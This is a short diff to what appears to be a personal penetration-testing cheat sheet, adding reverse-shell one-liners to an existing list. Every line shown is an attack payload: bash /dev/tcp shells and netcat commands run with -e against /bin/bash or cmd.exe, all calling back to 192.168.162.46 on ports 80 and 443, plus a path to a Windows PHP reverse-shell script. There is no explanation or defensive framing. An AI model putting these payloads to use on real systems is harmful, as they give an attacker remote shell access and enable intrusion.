@@ -29,8 +29,13 @@ php
 ~/tools/privesc_windows/windows-php-reverse-shell.php
 
 =================================== 
+#!/bin/bash 
+bash -c 'bash -i >& /dev/tcp/192.168.162.46/80 0>&1' 
+
+=================================== 
 Reverse
 nc -nv 192.168.162.46 443 -e /bin/bash
+nc -nv 192.168.162.46 443 -e cmd.exe 
 /bin/nc -e /bin/bash 192.168.162.46 80
 netcat -e /bin/bash 192.168.162.46 443
 bash -i >& /dev/tcp/192.168.162.46/443 0>&1
